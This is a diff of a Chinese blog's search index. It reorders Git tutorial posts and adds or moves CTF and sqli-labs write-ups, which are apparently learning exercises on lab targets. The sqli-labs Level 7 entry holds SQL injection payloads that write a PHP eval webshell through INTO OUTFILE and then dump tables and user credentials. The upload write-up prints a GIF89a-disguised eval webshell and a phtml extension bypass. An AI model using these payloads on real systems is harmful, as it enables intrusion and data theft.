@@ -711,6 +711,66 @@
       </tags>
   </entry>
   <entry>
+    <title>Git版本穿梭及版本比较</title>
+    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
+    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
+<li><p>状态查看：<code>git status</code></p>
+</li>
+<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
+</li>
+<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
+<p>简洁显示：<code>git log --pretty=oneline</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
+<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
+<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
+<p>HEAD@{移动到当前版本所需要步数}</p>
+<p>若版本信息有多屏</p>
+<p>则空格向下翻页，b向上翻页，q退出</p>
+<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
+<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
+<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
+<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
+<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
+<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
+<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
+<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
+<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
+<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
+<p>现在状态为</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
+<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
+<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
+<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
+<p>然后删除文件，并添加到暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
+<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
+<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
+<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
+<p>上图表示第一行删去了9个a</p>
+<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Git的分支管理级Git的基本原理</title>
     <url>/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h1 id="分支的意义"><a href="#分支的意义" class="headerlink" title="分支的意义"></a>分支的意义</h1><ul>
@@ -769,66 +829,6 @@
 <p>当分支文件不一样时，才会出现分支</p>
 <p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
 <p><strong>Git在本地的版本控制就完结了</strong></p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git版本穿梭及版本比较</title>
-    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
-    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
-<li><p>状态查看：<code>git status</code></p>
-</li>
-<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
-</li>
-<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
-<span id="more"></span></li>
-</ul>
-<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
-<p>简洁显示：<code>git log --pretty=oneline</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
-<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
-<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
-<p>HEAD@{移动到当前版本所需要步数}</p>
-<p>若版本信息有多屏</p>
-<p>则空格向下翻页，b向上翻页，q退出</p>
-<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
-<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
-<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
-<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
-<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
-<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
-<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
-<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
-<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
-<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
-<p>现在状态为</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
-<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
-<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
-<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
-<p>然后删除文件，并添加到暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
-<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
-<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
-<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
-<p>上图表示第一行删去了9个a</p>
-<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
 ]]></content>
       <tags>
         <tag>Git</tag>
@@ -1701,6 +1701,57 @@
       </tags>
   </entry>
   <entry>
+    <title>sqlilabs第7关</title>
+    <url>/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="配置关卡文件"><a href="#配置关卡文件" class="headerlink" title="配置关卡文件"></a>配置关卡文件</h1><p>首先，MySQL默认是不能通过sql上传文件的，具体请输入命令<code>show variables like &#39;%secure%&#39;</code> 查看</p>
+<p>若图中划红线的框为</p>
+<ul>
+<li><p>Null  不可上传</p>
+</li>
+<li><p>某一路径 只能在该路径及其子路径中上传</p>
+</li>
+<li><p>空   可以上传</p>
+<span id="more"></span></li>
+</ul>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124202815420.png" alt="image-20220124202815420"></p>
+<p>具体修改方法如下</p>
+<p>打开my.ini文件，并在[mysqld]栏中添加如下内容</p>
+<p><code>secure_file_priv=&quot;路径&quot;</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124203529805.png" alt="image-20220124203529805"></p>
+<p>然后重启MySQL即可生效。</p>
+<p>以上步骤实际上是完善题目，因为此题本来就是用上传文件做，没法上传文件就是没法做。</p>
+<h1 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h1><p>首先输入<code>id=1&#39;</code>，报错；然后输入<code>id=1&#39;--+</code>，还是报错；接着输入<code>id=1&#39;)--+</code>，还是报错；最后尝试输入<code>id=1&#39;))--+</code>，这次终于对了，所以闭合方式就是单引号加双括号。</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204428285.png" alt="image-20220124204428285"></p>
+<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p>这个没啥好说的，直接<code>order by</code>即可最后得出是3</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204525136.png" alt="image-20220124204525136"></p>
+<h1 id="上传木马并连接"><a href="#上传木马并连接" class="headerlink" title="上传木马并连接"></a>上传木马并连接</h1><p><code>?id=1&#39;))union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\a.php&quot;--+</code>注意这里是<strong>双反斜杠</strong></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204810866.png" alt="image-20220124204810866"></p>
+<p>然后查看靶机中相应的文件即可知道已经成功上传</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204957483.png" alt="image-20220124204957483"></p>
+<p>然后用中国蚁剑进行连接</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205105057.png" alt="image-20220124205105057"></p>
+<p>注意，这里要定位到a.php，而不是仅仅到Less-7文件夹，连接成功后如下图</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205159761.png" alt="image-20220124205159761"></p>
+<h1 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h1><p><code>?id=1&#39;))union select 1,2,database() into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\b.txt&quot;--+</code> 这里换成<strong>b.txt</strong>了</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205333775.png" alt="image-20220124205333775"></p>
+<p>用蚁剑查看</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205413565.png" alt="image-20220124205413565"></p>
+<p>可知当前数据库是<strong>security</strong></p>
+<h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p><code>?id=1&#39;))union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\c.txt&quot;--+</code>这里改成<strong>c.txt</strong>了，若仍是b.txt，则原先的b.txt不会改变，也不会新增内容。</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205728524.png" alt="image-20220124205728524"></p>
+<h1 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h1><p><code>?id=1&#39;))union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\d.txt&quot;--+</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205953312.png" alt="image-20220124205953312"></p>
+<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><p><code>?id=1&#39;))union select 1,2,group_concat(username,1,password) from security.users into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\e.txt&quot;--+</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124210110521.png" alt="image-20220124210110521"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实就是上传了一个一句话木马，然后用蚁剑进行查看相应数据，指令大多和第一关相似。</p>
+<p>特别之处就是用了<code>into outfile&quot;路径&quot;</code>这个语句。</p>
+<p>最后想说的是，蚁剑真的可怕！！！</p>
+]]></content>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlilabs第一关</title>
     <url>/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/</url>
     <content><![CDATA[<h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><ol>
@@ -1987,39 +2038,6 @@
       </tags>
   </entry>
   <entry>
-    <title>极客大挑战 2019上传</title>
-    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
-    <content><![CDATA[<p>该题为上传木马题</p>
-<p>进入题目后，上传一句话木马</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
-<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
-<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
-<p>得到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
-<p>上传失败</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
-<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
-<p>上传后</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
-<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
-<p>链接成功</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
-<p>最后在根目录下得到flag</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>第一次接触CTF</title>
     <url>/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/</url>
     <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-白给-amp-签到"><a href="#1-白给-amp-签到" class="headerlink" title="1.白给&amp;签到"></a>1.白给&amp;签到</h2><p>没什么可说的，直接复制粘贴。</p>
@@ -2066,6 +2084,39 @@
 ]]></content>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战 2019上传</title>
+    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
+    <content><![CDATA[<p>该题为上传木马题</p>
+<p>进入题目后，上传一句话木马</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
+<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
+<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
+<p>上传失败</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
+<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
+<p>上传后</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
+<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
+<p>链接成功</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
+<p>最后在根目录下得到flag</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
       </tags>
   </entry>
 </search>
